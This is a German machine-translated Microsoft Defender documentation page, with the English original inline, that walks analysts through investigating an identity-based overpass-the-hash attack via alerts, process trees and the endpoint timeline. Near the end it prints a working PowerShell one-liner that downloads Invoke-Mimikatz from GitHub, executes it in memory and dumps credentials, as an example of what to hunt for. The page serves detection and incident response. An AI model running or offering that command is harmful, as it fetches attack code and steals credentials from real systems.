---
title: Beispiel für einen identitätsbasierten Angriff
description: Gehen Sie durch eine Beispielanalyse eines identitätsbasierten Angriffs.
keywords: Vorfälle, Warnungen, untersuchen, Korrelation, Angriff, Computer, Geräte, Benutzer, Identitäten, Identität, Postfach, E-Mail, 365, microsoft, m365, Reaktion auf Vorfälle, Cyberangriff
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: e56d6d5d78101da1f6da4c14ade25e80aa5b5063
ms.sourcegitcommit: 05f40904f8278f53643efa76a907968b5c662d9a
ms.translationtype: MT
ms.contentlocale: de-DE
ms.lasthandoff: 04/30/2021
ms.locfileid: "52114678"
---
# <a name="example-of-an-identity-based-attack"></a><span data-ttu-id="db498-104">Beispiel für einen identitätsbasierten Angriff</span><span class="sxs-lookup"><span data-stu-id="db498-104">Example of an identity-based attack</span></span>

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

<span data-ttu-id="db498-105">**Gilt für:**</span><span class="sxs-lookup"><span data-stu-id="db498-105">**Applies to:**</span></span>
- <span data-ttu-id="db498-106">Microsoft 365 Defender</span><span class="sxs-lookup"><span data-stu-id="db498-106">Microsoft 365 Defender</span></span>

<span data-ttu-id="db498-107">Microsoft Defender for Identity kann dabei helfen, böswillige Versuche zu erkennen, Identitäten in Ihrer Organisation zu schädlich zu machen.</span><span class="sxs-lookup"><span data-stu-id="db498-107">Microsoft Defender for Identity can help detect malicious attempts to compromise identities in your organization.</span></span> <span data-ttu-id="db498-108">Da Defender for Identity in Microsoft 365 Defender integriert ist, können Sicherheitsanalysten Einblick in Bedrohungen von Defender for Identity erhalten, z. B. mutmaßliche Netlogon-Rechteerweiterungsversuche.</span><span class="sxs-lookup"><span data-stu-id="db498-108">Because Defender for Identity integrates with Microsoft 365 Defender, security analysts can have visibility on threats coming in from Defender for Identity, such as suspected Netlogon privilege elevation attempts.</span></span>

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a><span data-ttu-id="db498-109">Analysieren des Angriffs in Microsoft Defender for Identity</span><span class="sxs-lookup"><span data-stu-id="db498-109">Analyzing the attack in Microsoft Defender for Identity</span></span>

<span data-ttu-id="db498-110">Microsoft 365 Defender ermöglicht Es Analysten, Warnungen nach Erkennungsquelle auf der Registerkarte **Warnungen** auf der Seite Vorfälle zu filtern.</span><span class="sxs-lookup"><span data-stu-id="db498-110">Microsoft 365 Defender allows analysts to filter alerts by detection source on the **Alerts** tab of the incidents page.</span></span> <span data-ttu-id="db498-111">Im folgenden Beispiel wird die Erkennungsquelle nach **Defender for Identity gefiltert.**</span><span class="sxs-lookup"><span data-stu-id="db498-111">In the following example, the detection source is filtered to **Defender for Identity**.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Beispiel für das Filtern der Erkennungsquelle für Defender for Identity":::

<span data-ttu-id="db498-113">Wenn Sie **die Warnung für mutmaßliche Überführungen im** Hash auswählen, wird eine Seite in Microsoft Cloud App Security angezeigt, auf der ausführlichere Informationen angezeigt werden.</span><span class="sxs-lookup"><span data-stu-id="db498-113">Selecting the **Suspected overpass-the-hash attack** alert goes to a page in Microsoft Cloud App Security that displays more detailed information.</span></span> <span data-ttu-id="db498-114">Sie können immer mehr über eine Warnung oder einen Angriff erfahren, [](https://docs.microsoft.com/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) indem Sie **Weitere** Informationen zu diesem Warnungstyp auswählen, um eine Beschreibung des Angriffs sowie Korrekturvorschläge zu lesen.</span><span class="sxs-lookup"><span data-stu-id="db498-114">You can always find out more about an alert or attack by selecting **Learn more about this alert type** to read a [description of the attack](https://docs.microsoft.com/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) as well as remediation suggestions.</span></span>
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="Beispiel für eine mutmaßliche Benachrichtigung über die Überführung des Hashangriffs"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a><span data-ttu-id="db498-116">Untersuchen desselben Angriffs in Microsoft Defender for Endpoint</span><span class="sxs-lookup"><span data-stu-id="db498-116">Investigating the same attack in Microsoft Defender for Endpoint</span></span>

<span data-ttu-id="db498-117">Alternativ kann ein Analyst Defender for Endpoint verwenden, um mehr über die Aktivität auf einem Endpunkt zu erfahren.</span><span class="sxs-lookup"><span data-stu-id="db498-117">Alternatively, an analyst can use Defender for Endpoint to learn more about the activity on an endpoint.</span></span> <span data-ttu-id="db498-118">Wählen Sie den Vorfall aus der Warteschleife aus, und wählen Sie dann die Registerkarte **Warnungen** aus. Von hier aus können sie auch die Erkennungsquelle identifizieren.</span><span class="sxs-lookup"><span data-stu-id="db498-118">Select the incident from the incident queue, then select the **Alerts** tab. From here, they can identify the detection source as well.</span></span> <span data-ttu-id="db498-119">Eine Erkennungsquelle, die als EDR bezeichnet wird, steht für Endpoint Detection and Response, also Defender for Endpoint.</span><span class="sxs-lookup"><span data-stu-id="db498-119">A detection source labeled as EDR stands for Endpoint Detection and Response, which is Defender for Endpoint.</span></span> <span data-ttu-id="db498-120">Hier wählt der Analyst eine warnung aus, die von einem EDR.</span><span class="sxs-lookup"><span data-stu-id="db498-120">From here, the analyst select an alert detected by EDR.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Beispiel für eine Endpunkterkennung und -antwort in Defender for Endpoint"::: 

<span data-ttu-id="db498-122">Auf der Warnungsseite werden verschiedene relevante Informationen angezeigt, z. B. der Name des betroffenen Geräts, der Benutzername, der Status der automatischen Untersuchung und die Warnungsdetails.</span><span class="sxs-lookup"><span data-stu-id="db498-122">The alert page displays various pertinent information such as the impacted device name, username, status of auto-investigation, and the alert details.</span></span> <span data-ttu-id="db498-123">Der Warnungsstory zeigt eine visuelle Darstellung der Prozessstruktur.</span><span class="sxs-lookup"><span data-stu-id="db498-123">The alert story depicts a visual representation of the process tree.</span></span> <span data-ttu-id="db498-124">Die Prozessstruktur ist eine hierarchische Darstellung von übergeordneten und untergeordneten Prozessen im Zusammenhang mit der Warnung.</span><span class="sxs-lookup"><span data-stu-id="db498-124">The process tree is a hierarchical representation of parent and child processes related to the alert.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Beispiel für eine Benachrichtigungsprozessstruktur in Defender for Endpoint"::: 

<span data-ttu-id="db498-126">Jeder Prozess kann erweitert werden, um weitere Details anzuzeigen.</span><span class="sxs-lookup"><span data-stu-id="db498-126">Each process can be expanded to view additional details.</span></span> <span data-ttu-id="db498-127">Details, die ein Analyst sehen kann, sind die tatsächlichen Befehle, die als Teil eines bösartigen Skripts eingegeben wurden, ip-Adressen für ausgehende Verbindungen und andere nützliche Informationen.</span><span class="sxs-lookup"><span data-stu-id="db498-127">Details that an analyst can see are the actual commands that were entered as part of a malicious script, outbound connection IP addresses, and other useful information.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Beispiel für Prozessdetails in Defender for Endpoint":::
 
<span data-ttu-id="db498-129">Wenn Sie **in der Zeitachse anzeigen** auswählen, kann ein Analyst einen Drilldown noch weiter gehen, um den genauen Zeitpunkt des Kompromisses zu ermitteln.</span><span class="sxs-lookup"><span data-stu-id="db498-129">By selecting **See in timeline**, an analyst can drill down even further to determine the exact time of the compromise.</span></span> 

<span data-ttu-id="db498-130">Microsoft Defender for Endpoint kann viele schädliche Dateien und Skripts erkennen.</span><span class="sxs-lookup"><span data-stu-id="db498-130">Microsoft Defender for Endpoint can detect many malicious files and scripts.</span></span> <span data-ttu-id="db498-131">Aufgrund vieler legitimer Verwendungen für ausgehende Verbindungen, PowerShell und Befehlszeilenaktivitäten würden einige Aktivitäten jedoch als gutartig angesehen, bis eine schädliche Datei oder Aktivität erstellt wird.</span><span class="sxs-lookup"><span data-stu-id="db498-131">However, due to many legitimate uses for outbound connections, PowerShell, and command-line activity, some activity would be considered benign until it creates a malicious file or activity.</span></span> <span data-ttu-id="db498-132">Daher hilft die Verwendung der Zeitachse Analysten, die Warnung in den Kontext mit der umgebenden Aktivität zu setzen, um die ursprüngliche Quelle oder den Zeitpunkt des Angriffs zu bestimmen, die andernfalls durch allgemeine Dateisystem- und Benutzeraktivitäten verdeckt werden.</span><span class="sxs-lookup"><span data-stu-id="db498-132">Therefore, using the timeline helps analysts to put the alert into context with the surrounding activity to determine the original source or time of the attack that otherwise is obscured by common file system and user activity.</span></span> 

<span data-ttu-id="db498-133">Zu diesem Zeitpunkt würde ein Analyst zum Zeitpunkt der Warnungserkennung (in Rot) beginnen und einen Bildlauf nach unten durchführen, um zu bestimmen, wann die ursprüngliche Aktivität, die zu den schädlichen Aktivitäten führte, tatsächlich gestartet wurde.</span><span class="sxs-lookup"><span data-stu-id="db498-133">To do this, an analyst would start at the time of the alert detection (in red) and scroll down backwards in time to determine when the original activity that led to the malicious activity actually started.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Beispiel für das Starten zum Zeitpunkt der Warnungserkennung"::: 

<span data-ttu-id="db498-135">Es ist wichtig, allgemeine Aktivitäten wie Windows Updateverbindungen, Windows vertrauenswürdigen Softwareaktivierungsverkehr, andere häufige Verbindungen zu Microsoft-Websites, Internetaktivitäten von Drittanbietern, Microsoft Endpoint Configuration Manager-Aktivitäten und andere gutartige Aktivitäten von verdächtigen Aktivitäten zu verstehen und zu unterscheiden.</span><span class="sxs-lookup"><span data-stu-id="db498-135">It is important to understand and distinguish common activity such as Windows Update connections, Windows Trusted Software activation traffic, other common connections to Microsoft sites, third-party Internet activity, Microsoft Endpoint Configuration Manager activity, and other benign activity from suspicious activity.</span></span> <span data-ttu-id="db498-136">Eine Möglichkeit dazu ist die Verwendung von Zeitachsenfiltern.</span><span class="sxs-lookup"><span data-stu-id="db498-136">One way to accomplish this is by using timeline filters.</span></span> <span data-ttu-id="db498-137">Es gibt viele Filter, die bestimmte Aktivitäten hervorheben können, während alles herausfiltert wird, was der Analyst nicht anzeigen möchte.</span><span class="sxs-lookup"><span data-stu-id="db498-137">There are many filters that can highlight specific activity while filtering out anything that the analyst does not want to view.</span></span> 

<span data-ttu-id="db498-138">In der folgenden Abbildung hat der Analytiker gefiltert, um nur Netzwerk- und Prozessereignisse anzeigen zu können.</span><span class="sxs-lookup"><span data-stu-id="db498-138">In the image below, the analyst filtered to view only network and process events.</span></span> <span data-ttu-id="db498-139">Auf diese Weise kann der Analyst die Netzwerkverbindungen und Prozesse sehen, die das Ereignis umgeben, Editor eine Verbindung mit einer IP-Adresse hergestellt hat, die wir auch in der Prozessstruktur gesehen haben.</span><span class="sxs-lookup"><span data-stu-id="db498-139">This allows the analyst to see the network connections and processes surrounding the event where Notepad established a connection with an IP address, which we also saw in the process tree.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Beispiel, wie Editor zum Herstellen einer schädlichen ausgehenden Verbindung verwendet wurde"::: 

<span data-ttu-id="db498-141">In diesem speziellen Ereignis wurde Editor verwendet, um eine schädliche ausgehende Verbindung herzustellen.</span><span class="sxs-lookup"><span data-stu-id="db498-141">In this particular event, Notepad was used to make a malicious outbound connection.</span></span> <span data-ttu-id="db498-142">Häufig verwenden Angreifer jedoch einfach iexplorer.exe, um Verbindungen zum Herunterladen einer schädlichen Nutzlast herzustellen, da normalerweise iexplorer.exe Prozesse als reguläre Webbrowseraktivitäten angesehen werden.</span><span class="sxs-lookup"><span data-stu-id="db498-142">However, often attackers will simply use iexplorer.exe to establish connections to download a malicious payload because ordinarily iexplorer.exe processes are considered regular web browser activity.</span></span>

<span data-ttu-id="db498-143">Ein weiteres Element, nach dem sie in der Zeitachse suchen sollten, wäre die Verwendung von PowerShell für ausgehende Verbindungen.</span><span class="sxs-lookup"><span data-stu-id="db498-143">Another item to look for in the timeline would be PowerShell uses for outbound connections.</span></span> <span data-ttu-id="db498-144">Der Analyst würde nach erfolgreichen PowerShell-Verbindungen mit Befehlen suchen, z. B. gefolgt von einer ausgehenden Verbindung zu einer Website, die `IEX (New-Object Net.Webclient)` eine schädliche Datei hosten.</span><span class="sxs-lookup"><span data-stu-id="db498-144">The analyst would look for successful PowerShell connections with commands such as `IEX (New-Object Net.Webclient)` followed by an outbound connection to a website hosting a malicious file.</span></span> 

<span data-ttu-id="db498-145">Im folgenden Beispiel wurde PowerShell zum Herunterladen und Ausführen von Mimikatz von einer Website verwendet:</span><span class="sxs-lookup"><span data-stu-id="db498-145">In the following example, PowerShell was used to download and execute Mimikatz from a website:</span></span>

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
<span data-ttu-id="db498-146">Ein Analytiker kann schnell nach Schlüsselwörtern suchen, indem er das Schlüsselwort in der Suchleiste eintippt, um nur ereignisse anzeigen zu können, die mit PowerShell erstellt wurden.</span><span class="sxs-lookup"><span data-stu-id="db498-146">An analyst can quickly search for keywords by typing in the keyword in the search bar to display only events created with PowerShell.</span></span> 

## <a name="next-step"></a><span data-ttu-id="db498-147">Nächster Schritt</span><span class="sxs-lookup"><span data-stu-id="db498-147">Next step</span></span>

<span data-ttu-id="db498-148">Weitere Informationen finden Sie unter Phishing-Untersuchungspfad. [](first-incident-path-phishing.md)</span><span class="sxs-lookup"><span data-stu-id="db498-148">See the [phishing](first-incident-path-phishing.md) investigation path.</span></span>

## <a name="see-also"></a><span data-ttu-id="db498-149">Siehe auch</span><span class="sxs-lookup"><span data-stu-id="db498-149">See also</span></span>

- [<span data-ttu-id="db498-150">Übersicht über Vorfälle</span><span class="sxs-lookup"><span data-stu-id="db498-150">Incidents overview</span></span>](incidents-overview.md)
- [<span data-ttu-id="db498-151">Verwalten von Vorfällen</span><span class="sxs-lookup"><span data-stu-id="db498-151">Manage incidents</span></span>](manage-incidents.md)
- [<span data-ttu-id="db498-152">Analysieren von Vorfällen</span><span class="sxs-lookup"><span data-stu-id="db498-152">Analyze incidents</span></span>](investigate-incidents.md)
